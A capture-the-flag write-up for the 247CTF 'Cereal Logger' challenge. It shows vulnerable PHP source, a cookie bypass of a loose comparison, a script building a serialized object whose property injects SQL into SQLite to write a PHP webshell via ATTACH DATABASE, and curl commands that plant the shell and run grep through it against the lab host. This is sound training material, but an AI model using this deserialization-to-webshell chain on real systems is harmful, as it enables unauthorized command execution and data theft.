# CEREAL LOGGER [HARD]

## Description

> Using a specially crafted cookie, you can write data to /dev/null. Can you abuse the write and read the flag?

## Source Code

<details><summary>Click here for source code in text format</summary>

```php
<?php

class insert_log
{
    public $new_data = "Valid access logged!";
    public function __destruct()
    {
        $this->pdo = new SQLite3("/tmp/log.db");
        $this->pdo->exec("INSERT INTO log (message) VALUES ('".$this->new_data."');");
    }
}

if (isset($_COOKIE["247"]) && explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0") {
    file_put_contents("/dev/null", unserialize(base64_decode(explode(".", $_COOKIE["247"])[0])));
} else {
    echo highlight_file(__FILE__, true);
}
```

</details>

## Short Solution Description / Tags

Insecure Deserialization in PHP, SQLite SQL Injection, RCE

## Solution

```php
explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0"
```

Regard with this if condition, we can set it to true with the cookie 247=\<b64>.0e.

To create webshell, set SQLi Attach Database payload to new_data property of insert_log class.

create_payload.php

```php
<?php
class insert_log
{
    public $new_data = "";
}

$obj = new insert_log();
$obj->new_data = $obj->new_data . '\');';
$obj->new_data = $obj->new_data . "ATTACH DATABASE 'pwn2.php' AS lol;";
$obj->new_data = $obj->new_data . "CREATE TABLE lol.pwn (dataz text);";
$obj->new_data = $obj->new_data . 'INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET[\'cmd\']); ?>");';
$obj->new_data = $obj->new_data . '--';

echo base64_encode(serialize($obj));
```

Result:

```console
$ PAYLOAD=$(php create_payload.php)

$ curl https://7aeff6c2aea837f4.247ctf.com/ -b "247=$PAYLOAD.0e"

$ curl -o- -s https://7aeff6c2aea837f4.247ctf.com/pwn2.php -G --data-urlencode "cmd=grep -ao '247CTF{[0-9a-f]*}' /tmp/log.db"
 I247CTF{[REDACTED]}
```

## References

- [Remote Command Execution using SQLite command - Attach Database](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/SQLite%20Injection/#remote-command-execution-using-sqlite-command-attach-database)
